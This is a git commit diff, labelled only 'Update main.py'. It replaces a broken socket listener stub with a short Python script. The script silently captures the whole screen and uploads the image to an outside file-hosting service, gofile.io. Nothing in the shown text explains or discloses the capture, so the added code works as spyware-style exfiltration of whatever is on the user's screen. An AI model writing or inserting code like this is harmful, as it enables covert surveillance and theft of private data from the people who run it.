cd264c6452982a81b2f1e73aad23c3bbc6c836c6
421stlimat <127832637+421stlimat@users.noreply.github.com>
2023-05-06 10:56:42 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,11 +1,19 @@
-from time import sleep
-from socket import socket
-try:
-    s =socket()
-    s.bind(('127.0.0.1', 1231))
-    s.listen(1)
-    d =a.accept()
-except: ...
+import requests
+from PIL import ImageGrab
+import io
 
-while True:
-    sleep(10)
+# Take a screenshot
+screenshot = ImageGrab.grab()
+
+# Convert the image to bytes
+with io.BytesIO() as output:
+    screenshot.save(output, format='PNG')
+    image_bytes = output.getvalue()
+
+# Upload the image to Gofile
+url = "https://srv-store4.gofile.io/uploadFile"
+
+response = requests.post(url, files={"file": ("screenshot.png", image_bytes)})
+
+# Print the URL of the uploaded file
+print(response.json())
